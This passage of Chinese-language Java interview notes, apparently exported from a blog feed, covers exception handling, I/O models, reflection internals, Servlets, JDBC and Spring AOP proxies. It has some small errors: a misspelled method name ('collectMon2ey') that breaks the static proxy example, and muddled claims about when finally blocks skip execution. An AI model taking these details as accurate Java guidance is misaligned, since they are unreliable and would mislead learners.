<li><p><code>try块</code>： 用于捕获异常。其后可接零个或多个<code>catch</code>块，如果没有catch块，则必须跟一个<code>finally</code>块。</p>
</li>
<li><p><code>catch块</code>：用于处理<code>try</code>捕获到的异常</p>
</li>
<li><p><code>finally块</code>：无论是否捕获或处理异常，<code>finally</code>中的语句都会被执行。</p>
<blockquote>
<p>当try和finaly语句中都有return语句时，在方法返回之前，finally语句的内容将被执行，并且finally语句的返回值将会覆盖原始的返回值。</p>
</blockquote>
</li>
<li><p><code>throw</code>：用于在代码中明确的排除一个异常</p>
</li>
<li><p><code>throws</code>：用在方法声明上标明函数可能抛出的各种异常。</p>
</li>
</ul>
<h2 id="finally块不会被执行的四种情况"><a href="#finally块不会被执行的四种情况" class="headerlink" title="finally块不会被执行的四种情况"></a>finally块不会被执行的四种情况</h2><ul>
<li>在finally语句块第一行发生了异常。因为在其他行，finally块还是会得到执行</li>
<li>在前面的代码中用了<code>System.exit(int)</code>已退出程序。 exit是带参函数；若该语句在异常语句之后，finally会执行</li>
<li>程序所在的线程死亡。</li>
<li>关闭CPU。</li>
</ul>
<h2 id="运行时异常与受检异常有什么区别"><a href="#运行时异常与受检异常有什么区别" class="headerlink" title="运行时异常与受检异常有什么区别"></a>运行时异常与受检异常有什么区别</h2><h3 id="运行时异常"><a href="#运行时异常" class="headerlink" title="运行时异常"></a>运行时异常</h3><p>表示虚拟机的通常操作中可能遇到的异常，是一种常见的运行错误，只要程序设计得当通常就不会发生。</p>
<p>当出现这样的异常，可以不处理，总是由虚拟机接管。<code>RuntimeException</code>下的类便都是运行时异常。</p>
<h3 id="受检异常"><a href="#受检异常" class="headerlink" title="受检异常"></a>受检异常</h3><p>跟程序的上下文环境有关，即使程序设计无误，仍然可能因使用的问题而导致异常。</p>
<p>Java编译器要求方法必须声明抛出可能发生的受检异常，但是并不要求必须声明抛出未被捕获的运行时异常。</p>
<h1 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h1><h2 id="IO分类"><a href="#IO分类" class="headerlink" title="IO分类"></a>IO分类</h2><ul>
<li>按照流的流向，分为<strong>输入流</strong>和<strong>输出流</strong></li>
<li>按照操作单元划分，分为<strong>字节流</strong>和<strong>字符流</strong></li>
<li>按照流的角色划分为<strong>节点流</strong>和<strong>处理流</strong></li>
</ul>
<h2 id="BIO，NIO，AIO的区别"><a href="#BIO，NIO，AIO的区别" class="headerlink" title="BIO，NIO，AIO的区别"></a>BIO，NIO，AIO的区别</h2><h3 id="BIO-Blocking-I-O"><a href="#BIO-Blocking-I-O" class="headerlink" title="BIO(Blocking I/O)"></a>BIO(Blocking I/O)</h3><p>同步阻塞I/O，数据的读取和写入都必须阻塞在一个进程内等待完成。</p>
<p>这种方式在连接数不是特别高的情况下，可以让每一个连接都专注于自己的I/O，并且编程模型简单，也不用过多的考虑系统的过载、限流等问题。但是，当面对十万甚至百万级连接的时候，传统的BIO模型是无能为力的。因此，需要一种更高效的I/O处理模型来应对更高的并发量。</p>
<h3 id="NIO-New-I-O"><a href="#NIO-New-I-O" class="headerlink" title="NIO(New I/O)"></a>NIO(New I/O)</h3><p>NIO是一种同步非阻塞的I/O模型，它是支持面向缓冲的，基于通道的I/O操作方法</p>
<p>但是其I/O行为还是同步的，对于NIO来说，业务线程是在IO操作准备好时，才得到通知，接着就由这个线程自行完成IO操作，IO操作本身是同步的。</p>
<h3 id="AIO（Asynchronous-I-O）"><a href="#AIO（Asynchronous-I-O）" class="headerlink" title="AIO（Asynchronous I/O）"></a>AIO（Asynchronous I/O）</h3><p>AIO也就是NIO2，是异步非阻塞模式。异步IO是基于事件和回调机制实现的，也就是应用操作之后会直接返回，不会堵塞在那里，当后台处理完成，操作系统会通知相应的线程进行后续的操作。</p>
<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="1-如何通过反射创建对象以及获取和设置对象私有属性字段的值？"><a href="#1-如何通过反射创建对象以及获取和设置对象私有属性字段的值？" class="headerlink" title="1. 如何通过反射创建对象以及获取和设置对象私有属性字段的值？"></a>1. 如何通过反射创建对象以及获取和设置对象私有属性字段的值？</h2><p>对象通过 <code>getClass()</code> 方法可以获得其 <code>Class</code> 对象，</p>
<ul>
<li><p>通过该 <code>Class</code> 对象的 <code>getDeclaredFields()</code> 方法获取包括 <code>private</code> 在内所有的属性；</p>
</li>
<li><p>通过 <code>getDeclaredMethods()</code> 方法可以获取当前类包括 <code>private</code> 在内所有方法，但是不包括父类。</p>
</li>
<li><p>通过<code>setAccesssible(true)</code>将其设置成可以访问（去除访问修饰符的检查）。</p>
</li>
</ul>
<h2 id="2-JAVA-反射的原理"><a href="#2-JAVA-反射的原理" class="headerlink" title="2. JAVA 反射的原理"></a>2. JAVA 反射的原理</h2><p>反射调用过程如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class actionClass=Class.forName(<span class="string">&quot;MyClass&quot;</span>);</span><br><span class="line">Object action=actionClass.newInstance();</span><br><span class="line">Method method = actionClass.getMethod(<span class="string">&quot;myMethod&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">method.invoke(action,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<h3 id="forName-方法"><a href="#forName-方法" class="headerlink" title="forName 方法"></a>forName 方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;package.demo&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 先通过反射，获取调用者进来的类信息，从而获取当前的 classLoader            </span></span><br><span class="line">    Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">    <span class="comment">// 调用native方法进行获取class信息</span></span><br><span class="line">    <span class="keyword">return</span> forName0(className, <span class="keyword">true</span>, ClassLoader.getClassLoader(caller), caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>forName</code> 方法默认使用调用者的类加载器。<code>forName()</code>反射获取类信息，并没有将实现留给了 java,而是交给了 jvm 去加载，主要是先获取 <code>ClassLoader</code>然后调用 <code>native</code> 方法，根据传入的类全名和类加载器获取信息加载类则是回调 <code>java.lang.ClassLoader</code>最后，jvm 又会回调 <code>ClassLoader</code> 进行类加载过程。</p>
<h3 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h3><p><code>newInstance()</code> 主要做了三件事：</p>
<ol>
<li>权限检测，如果不通过直接抛出异常 private(没有暴力反射)</li>
<li>查找无参构造器，并将其缓存起来，这个过程分三步：</li>
<li>调用具体方法的无参构造方法，生成实例并返回</li>
</ol>
<p>在查询无参构造器的时候，使用 <code>getConstructor0()</code> 为获取匹配的构造器，分三步；</p>
<ol>
<li>先获取所有的 constructors, 然后通过进行参数类型比较；</li>
<li>找到匹配后，通过 <code>ReflectionFactory</code> <code>copy</code>一份 constructor 返回；</li>
<li>否则抛出 <code>NoSuchMethodException</code>;</li>
</ol>
<p>而获取所有的构造器主要步骤，都在 <code>privateGetDeclaredConstructors()</code> 方法里：</p>
<ol>
<li>先尝试从缓存中获取；</li>
<li>如果缓存没有，则从 jvm 中重新获取，并存入缓存，缓存使用软引用进行保存，保证内存可用；</li>
</ol>
<h3 id="getMethod-“myMethod”"><a href="#getMethod-“myMethod”" class="headerlink" title="getMethod(“myMethod”)"></a>getMethod(“myMethod”)</h3><ol>
<li>获取所有方法列表；</li>
<li>根据方法名称和方法列表，选出符合要求的方法；</li>
<li>如果没有找到相应方法，抛出异常，否则返回对应方法；</li>
</ol>
<ul>
<li><p>在获取所有方法列表的过程中，首先会从缓存中去寻找。</p>
</li>
<li><p>在匹配到方法名后，进行参数类型匹配，但是，匹配到一个方法，并没有退出 for 循环，而是继续进行匹配。这是因为进行最优匹配，匹配最精确的子类进行返回。最后，通过 <code>ReflectionFactory</code> 的 <code>copy</code> 方法后返回！</p>
</li>
</ul>
<p><img src="http://qiniu.xiaoming.net.cn/Method%E5%AF%B9%E8%B1%A1%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B.png" alt="Method 对象生成过程"></p>
<p>每个类都会有一个与之对应的 Class 实例，JVM 管理着这个 Class 实例，这个实例里维护着该类的所有 Method，Field，Constructor 的 cache，这份 cache 也可以被称作根对象。</p>
<p>每次 getMethod 获取到的 Method 对象都持有对根对象的引用，因为一些重量级的 Method 的成员变量（主要是 MethodAccessor），我们不希望每次创建 Method 对象都要重新初始化，于是所有代表同一个方法的 Method 对象都共享着根对象的 MethodAccessor，每一次创建都会调用根对象的 copy 方法复制一份</p>
<h3 id="Method-invoke-反射调用方法"><a href="#Method-invoke-反射调用方法" class="headerlink" title="Method.invoke() 反射调用方法"></a>Method.invoke() 反射调用方法</h3><img src="http://qiniu.xiaoming.net.cn/%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8invoke%E6%96%B9%E6%B3%95%E6%B5%81%E7%A8%8B.png" alt="反射调用 invoke 方法流程" style="zoom:67%;" />

<p>调用 <code>Method.invoke</code> 之后，会直接去调 <code>MethodAccessor.invoke</code>,最终是由 jvm 执行 <code>invoke0()</code> 执行。<code>MethodAccessor</code> 就是上面提到的所有同名 <code>method</code> 共享的一个实例，由 <code>ReflectionFactory</code> 创建。</p>
<p>创建机制采用了一种名为 <code>inflation</code> 的方式（JDK1.4之后）：如果该方法的累计调用次数 <code>&lt;=15</code>，会创建出<code>NativeMethodAccessorImpl</code>，它的实现就是直接调用 <code>native</code> 方法实现反射；如果该方法的累计调用次数 <code>&gt;15</code>，会由 java 代码创建出字节码组装而成的 <code>MethodAccessorImpl</code>。（是否采用 inflation 和 15 这个数字都可以在 jvm 参数中调整）</p>
<h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="1-Servlet接口有哪些方法以及Servlet的生命周期"><a href="#1-Servlet接口有哪些方法以及Servlet的生命周期" class="headerlink" title="1.Servlet接口有哪些方法以及Servlet的生命周期"></a>1.Servlet接口有哪些方法以及Servlet的生命周期</h2><p>Servlet定义了5个方法，其中三个方法与Servlet的生命周期相关</p>
<ul>
<li><code>void init(ServletConfig config) throws ServletException</code></li>
<li><code>void service(ServletRequest req, ServletResponse resp) throws ServletException, java.io.IOException</code></li>
<li><code>void destroy()</code></li>
<li><code>java.lang.String getServletInfo()</code></li>
<li><code>ServletConfig getServletConfig()</code></li>
</ul>
<h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>Web容器加载Servlet并将其实例化，Servlet的生命周期开始，容器运行<code>init()</code>方法进行Servlet的初始化；请求到达调用Servlet的<code>service()</code>方法，<code>service()</code>方法根据需要调用与请求对应的<code>doGet()</code>或<code>doPost()</code>方法;当服务器关闭或项目被卸载时服务器会将Servlet实例销毁，此时会调用Servlet的<code>destory</code>方法。</p>
<p><code>init()</code>和<code>destory()</code>方法在整个生命周期中只会执行一次，<code>service()</code>方法客户端每次请求Servlet都会执行。Servlet中有时会用到一些需要初始化与销毁的资源，因此可以把初始化资源的代码放入<code>init()</code>方法中，销毁资源的代码放入<code>destroy()</code>方法中，这样就不需要每次处理客户端的请求都要初始化与销毁资源。（<strong>单例</strong>）</p>
<h2 id="2-Servlet线程安全问题"><a href="#2-Servlet线程安全问题" class="headerlink" title="2.Servlet线程安全问题"></a>2.Servlet线程安全问题</h2><p>Servlet不是线程安全的，多线程并发的读写会导致<strong>数据不同步</strong>的问题。解决的办法是尽量不要在Servlet类中定义<code>name</code>属性（成员变量），而是要把<code>name</code>变量分别定义在<code>doGet()</code>和<code>doPost()</code>方法内。虽然使用<code>synchronized(name)&#123;&#125;</code>语句块可以解决问题，但是会造成线程的等待，不是很科学的办法。</p>
<p>注意：多线程的并发的读写Servlet类属性会导致数据不同步。但是如果只是并发地读取属性而不写入，则不存在数据不同步的问题。因此<strong>Servlet里的只读属性最好定义为<code>final</code>类型的。</strong></p>
<h2 id="3-JDBC-使用流程"><a href="#3-JDBC-使用流程" class="headerlink" title="3. JDBC 使用流程"></a>3. JDBC 使用流程</h2><ol>
<li>注册 JDBC 驱动（<code>Class.forName(&quot;com.mysql.jdbc.Driver&quot;)</code>）</li>
<li>打开连接（<code>DriverManager.getConnection(&quot;url&quot;,&quot;name&quot;,&quot;password&quot;)</code>）</li>
<li>根据连接，创建 Statement（<code>conn.prepareStatement(sql)</code>）</li>
<li>设置参数（<code>stmt.setString(1, &quot;wyf&quot;);</code>）</li>
<li>执行查询（<code>stmt.executeQuery();</code>）</li>
<li>处理结果，结果集映射（<code>resultSet.next()</code>）</li>
<li>关闭资源（<code>finally</code>）</li>
</ol>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>javaSpring</title>
    <url>/2021/01/21/javaSpring/</url>
    <content><![CDATA[<h1 id="1-静态代理，JDK动态代理，CGLIB动态代理"><a href="#1-静态代理，JDK动态代理，CGLIB动态代理" class="headerlink" title="1. 静态代理，JDK动态代理，CGLIB动态代理"></a>1. 静态代理，JDK动态代理，CGLIB动态代理</h1><p>AOP主要是基于代理实现，其基本原理就是静态代理，JDK动态代理和CGLIB动态代理。</p>
<a id="more"></a>

<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理主要是指自己通过代码实现的代理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象角色</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">confer</span><span class="params">()</span></span>;<span class="comment">//面谈</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">signContract</span><span class="params">()</span></span>;<span class="comment">//签合同</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">bookTicket</span><span class="params">()</span></span>;<span class="comment">//订票</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sing</span><span class="params">()</span></span>;<span class="comment">//唱歌</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">collectMon2ey</span><span class="params">()</span></span>;<span class="comment">//收钱</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//真实角色</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RealStar</span> <span class="keyword">implements</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">confer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.confer()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">signContract</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.signContract()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bookTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.bookTicker()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sing</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.sing()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">collectMoney</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.collectMoney()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代理角色</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyStar</span> <span class="keyword">implements</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Star star;<span class="comment">//代理的对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ProxyStar</span><span class="params">(Star star)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.star = star;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">confer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ProxyStar.confer&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">signContract</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ProxyStar.signContract&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bookTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ProxyStar.bookTicket&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sing</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//这里需要真实角色的功能</span></span><br><span class="line">        star.sing();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">collectMoney</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ProxyStar.collectMoney&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Star realStar = <span class="keyword">new</span> RealStar();</span><br><span class="line">        Star proxyStar = <span class="keyword">new</span> ProxyStar(realStar);</span><br><span class="line"></span><br><span class="line">        proxyStar.confer();</span><br><span class="line">        proxyStar.signContract();</span><br><span class="line">        proxyStar.bookTicket();</span><br><span class="line">        proxyStar.sing();<span class="comment">//此时调用真实角色</span></span><br><span class="line">        proxyStar.collectMoney();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><blockquote>
<p>通过<code>Proxy.newProxyInstance(Classloader,class[]&#123;interface.class&#125;,handler)</code>来得到代理类</p>
<p>代理类继承<code>InvocationHandler</code>接口，实现了<code>invoke(Object proxy,Method method,Object args)</code>方法</p>
</blockquote>
<p>通过Proxy生成的代理类内部会有一个<code>handler</code>属性，调用方法时，实际上都会传到<code>handler</code>中的<code>invoke()</code>方法，将代理对象，被代理类方法和变量参数传入到<code>invoke</code>中，故可以在<code>invoke()</code>方法中编写代码实现对真实类方法的增强。</p>
<p>这种方法对于同一接口而不同的实现类来说，可以用同一个代理类来实现代理，实现“<strong>一次编写到处代理</strong>”的效果，但是这种方法的缺点是<strong>要求被代理的类一定要是实现了某个接口</strong>的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象角色</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">confer</span><span class="params">()</span></span>;<span class="comment">//面谈</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">signContract</span><span class="params">()</span></span>;<span class="comment">//签合同</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">bookTicket</span><span class="params">()</span></span>;<span class="comment">//订票</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sing</span><span class="params">()</span></span>;<span class="comment">//唱歌</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">collectMoney</span><span class="params">()</span></span>;<span class="comment">//收钱</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//真实角色</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RealStar</span> <span class="keyword">implements</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">confer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.confer()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">signContract</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.signContract()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bookTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.bookTicker()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sing</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.sing()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">collectMoney</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;realstar.collectMoney()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态代理处理器</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StarHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Star realStar;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StarHandler</span><span class="params">(Star realStar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.realStar = realStar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy 代理类对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 被代理对象的方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args 方法的参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> invoke方法返回的结果，就是原始方法返回的结果</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Object object = <span class="keyword">null</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;真正的方法执行前。。。&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;面谈，签合同，预付款，订票&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;sing&quot;</span>))&#123;</span><br><span class="line">            object = method.invoke(realStar, args);<span class="comment">//激活调用方法</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;真正的方法执行后&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;收尾款&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Star realStar = <span class="keyword">new</span> RealStar();</span><br><span class="line">        StarHandler handler = <span class="keyword">new</span> StarHandler(realStar);</span><br><span class="line"></span><br><span class="line">        Star proxy = (Star) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Star.class&#125;,handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//会调用invoke方法</span></span><br><span class="line">        proxy.bookTicket();</span><br><span class="line">        proxy.sing();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CGLIB库代理"><a href="#CGLIB库代理" class="headerlink" title="CGLIB库代理"></a>CGLIB库代理</h2><p>CGLIB是一个字节码增强库，为AOP提供了底层支持，可以直接对实现类进行操作而非接口。使用前需要先导入<code>cglib</code>的包。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.Enhancer;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CGlibAgent</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object proxy;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getInstance</span><span class="params">(Object proxy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.proxy = proxy;</span><br><span class="line">        Enhancer enhancer = <span class="keyword">new</span> Enhancer();</span><br><span class="line">        enhancer.setSuperclass(<span class="keyword">this</span>.proxy.getClass());</span><br><span class="line">        <span class="comment">//回调方法</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">//创建代理对象</span></span><br><span class="line">        <span class="keyword">return</span> enhancer.create();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object o, Method method, Object[] objects, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用方法前...&quot;</span>);</span><br><span class="line">        <span class="comment">//真正调用</span></span><br><span class="line">        Object ret = methodProxy.invokeSuper(o, objects);</span><br><span class="line">        System.out.println(<span class="string">&quot;调用方法后...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CGlibAgent cGlibAgent = <span class="keyword">new</span> CGlibAgent();</span><br><span class="line">        RealStar star = (RealStar) cGlibAgent.getInstance(<span class="keyword">new</span> RealStar());</span><br><span class="line">        star.sing();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AOP思想的实现一般都是基于<strong>代理模式</strong>，在JAVA中一般采用JDK动态代理，但是JDK动态代理只能代理接口而不能代理类，因此，<code>Spring AOP</code>会通过以下方式进行切换：</p>
<ul>
<li>如果目标对象的实现类实现了接口，Spring AOP将会采用 JDK动态代理 来生成AOP代理类</li>
<li>如果目标对象的实现类没有实现接口，Spring AOP将会采用 CGLIB字节码增强库 来生成AOP代理类</li>
</ul>
<h1 id="2-Spring-AOP相关概念"><a href="#2-Spring-AOP相关概念" class="headerlink" title="2. Spring AOP相关概念"></a>2. Spring AOP相关概念</h1><p>AOP是面向切面编程的一种设计思想，可以<strong>分离系统的业务逻辑和系统服务</strong>(日志，安全等)</p>
<p><img src="http://qiniu.xiaoming.net.cn/SpringAOP%E6%A6%82%E5%BF%B5" alt="springAop概念"></p>
<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul>
